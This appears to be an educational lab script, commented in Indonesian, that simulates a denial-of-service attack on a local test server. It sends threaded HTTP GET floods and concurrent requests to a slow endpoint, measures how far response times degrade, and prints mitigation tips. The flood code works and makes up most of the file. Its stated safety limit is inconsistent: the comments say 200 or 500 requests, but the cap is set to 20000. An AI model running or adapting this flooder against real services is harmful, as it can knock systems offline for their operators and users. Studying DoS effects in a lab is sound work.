"""
[LAB] DoS Attack Simulator — DEMO TERBATAS
Mendemonstrasikan efek Denial of Service pada response time.
Maksimum 200 request untuk keperluan demo.
HANYA untuk keperluan edukasi di lingkungan lab lokal.

Jalankan website.py terlebih dahulu, lalu:
  python attack.py [--threads 20] [--requests 100] [--target fast|heavy]
"""

import requests
import threading
import time
import argparse
import statistics
from colorama import Fore, Style, init
from queue import Queue

init(autoreset=True)
BASE_URL = "http://192.168.1.14:5004"
MAX_REQUESTS = 20000      # Hard cap untuk keamanan demo


def banner():
    print(Fore.RED + "=" * 60)
    print(Fore.RED + "  [LAB] DoS Attack Simulator (DEMO TERBATAS)")
    print(Fore.RED + "  Target  : " + BASE_URL)
    print(Fore.YELLOW + "  Max req : " + str(MAX_REQUESTS))
    print(Fore.YELLOW + "  HANYA untuk edukasi di lingkungan lab!")
    print(Fore.RED + "=" * 60)


def check_server():
    try:
        r = requests.get(BASE_URL + "/fast", timeout=3)

        print("STATUS:", r.status_code)
        print("BODY:", r.text[:200])

        data = r.json()

        print(f"[+] Server aktif — {BASE_URL}")
        return True

    except Exception as e:
        print("ERROR:", repr(e))
        return False


def measure_baseline(endpoint: str, samples: int = 5) -> float:
    """Ukur response time baseline sebelum serangan."""
    times = []
    for _ in range(samples):
        try:
            t = time.time()
            requests.get(BASE_URL + endpoint, timeout=10)
            times.append(time.time() - t)
        except Exception:
            times.append(999.0)
        time.sleep(0.1)
    avg = statistics.mean(times)
    print(Fore.CYAN + f"  [Baseline] {samples} request → avg: {avg*1000:.1f} ms")
    return avg


def flood_worker(endpoint: str, queue: Queue, results: list, errors: list):
    """Worker thread: kirim request terus-menerus sampai queue habis."""
    while not queue.empty():
        queue.get()
        try:
            t = time.time()
            r = requests.get(BASE_URL + endpoint, timeout=10)
            elapsed = time.time() - t
            results.append(elapsed)
        except requests.exceptions.Timeout:
            errors.append("timeout")
            results.append(10.0)
        except Exception as e:
            errors.append(str(e))
        queue.task_done()


def run_flood(endpoint: str, num_requests: int, num_threads: int):
    """Jalankan flood dengan thread pool."""
    q = Queue()
    for _ in range(num_requests):
        q.put(1)

    results = []
    errors  = []
    threads = [
        threading.Thread(target=flood_worker, args=(endpoint, q, results, errors), daemon=True)
        for _ in range(num_threads)
    ]

    start = time.time()
    for t in threads:
        t.start()

    # Progress display
    while not q.empty():
        done = num_requests - q.qsize()
        bar = "█" * (done * 30 // num_requests)
        pct = done * 100 // num_requests
        print(f"  Flooding: [{bar:<30}] {pct:>3}%  {done}/{num_requests}  "
              f"errors:{len(errors)}", end="\r")
        time.sleep(0.2)

    for t in threads:
        t.join()
    elapsed = time.time() - start
    print()
    return results, errors, elapsed


def analyze_results(baseline_avg: float, flood_results: list, errors: list, elapsed: float,
                    num_threads: int):
    if not flood_results:
        print(Fore.RED + "  Tidak ada hasil (semua request gagal)")
        return

    avg     = statistics.mean(flood_results)
    p95     = sorted(flood_results)[int(len(flood_results) * 0.95)]
    max_rt  = max(flood_results)
    rps     = len(flood_results) / elapsed

    print(Fore.YELLOW + "\n  ── Hasil Flood ──")
    print(f"  Request terkirim : {len(flood_results)}")
    print(f"  Errors/Timeouts  : {len(errors)}")
    print(f"  Total waktu      : {elapsed:.2f} detik")
    print(f"  Throughput       : {rps:.1f} req/detik")
    print(f"  Avg response     : {avg*1000:.1f} ms")
    print(f"  P95 response     : {p95*1000:.1f} ms")
    print(f"  Max response     : {max_rt*1000:.1f} ms")

    degradation = avg / baseline_avg if baseline_avg > 0 else 1
    if degradation > 3:
        print(Fore.RED + f"\n  ⚠ DEGRADASI {degradation:.1f}x dari baseline!")
        print(Fore.RED + "  Server mengalami perlambatan signifikan.")
    elif degradation > 1.5:
        print(Fore.YELLOW + f"\n  ⚡ Degradasi ringan ({degradation:.1f}x)")
    else:
        print(Fore.GREEN + f"\n  ✓ Server masih merespons normal ({degradation:.1f}x)")


def demo_http_flood():
    print(Fore.CYAN + "\n[1] HTTP Flood — GET /fast (endpoint ringan)")
    print("-" * 55)
    baseline = measure_baseline("/fast")
    print(f"  Memulai flood ({args.requests} req, {args.threads} threads)...")
    results, errors, elapsed = run_flood(f"/{args.target}", args.requests, args.threads)
    analyze_results(baseline, results, errors, elapsed, args.threads)


def demo_slowloris_concept():
    """Demonstrasi konsep Slowloris — buka banyak koneksi bersamaan dengan /heavy."""
    print(Fore.CYAN + "\n[2] Slow Request Attack — GET /heavy (endpoint berat)")
    print("-" * 55)
    print("  Konsep: attacker membanjiri endpoint yang lambat/berat")
    print("  Setiap request 'menahan' satu thread server")
    baseline = measure_baseline("/heavy?delay=0.1")
    n = min(args.requests // 2, 50)
    print(f"  Mengirim {n} request ke /heavy secara bersamaan...")
    results, errors, elapsed = run_flood("/heavy?delay=0.1", n, min(args.threads, 20))
    analyze_results(baseline, results, errors, elapsed, args.threads)


def show_stats_before_after():
    try:
        r = requests.get(BASE_URL + "/stats", timeout=5)
        data = r.json()
        print(Fore.CYAN + "\n[3] Statistik Server Setelah Serangan:")
        print(f"  Total request diterima : {data['total_requests']}")
        print(f"  Uptime                 : {data['uptime_sec']} detik")
        print(f"  Rata-rata RPS          : {data['avg_rps']}")
    except Exception:
        pass


def show_mitigation():
    print(Fore.GREEN + "\n[MITIGASI DoS / DDoS]")
    print("-" * 55)
    tips = [
        ("Rate Limiting",     "Nginx: limit_req_zone / Flask-Limiter — max N req/s per IP"),
        ("Connection Limit",  "Batasi koneksi simultan dari satu IP"),
        ("Timeout agresif",   "Tutup koneksi yang tidak aktif dalam 30 detik"),
        ("Load Balancer",     "Distribusikan traffic ke banyak server"),
        ("CDN / WAF",         "Cloudflare / AWS Shield menyerap traffic flood"),
        ("IP Blocking",       "Fail2ban / iptables blokir IP yang melewati threshold"),
        ("CAPTCHA",           "Paksa verifikasi manusia saat traffic tinggi"),
        ("Anycast",           "Routing Anycast menyerap DDoS di edge network"),
    ]
    for title, desc in tips:
        print(Fore.GREEN + f"  ✓ {title}")
        print(f"    {desc}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="[LAB] DoS Simulator")
    parser.add_argument("--threads",  type=int, default=10, help="Jumlah thread (default: 10)")
    parser.add_argument("--requests", type=int, default=100, help="Total request (max 500)")
    parser.add_argument("--target",   default="fast", choices=["fast", "heavy"],
                        help="Endpoint target: fast atau heavy (default: fast)")
    args = parser.parse_args()
    args.requests = min(args.requests, MAX_REQUESTS)

    banner()
    if not check_server():
        exit(1)

    demo_http_flood()
    demo_slowloris_concept()
    show_stats_before_after()
    show_mitigation()
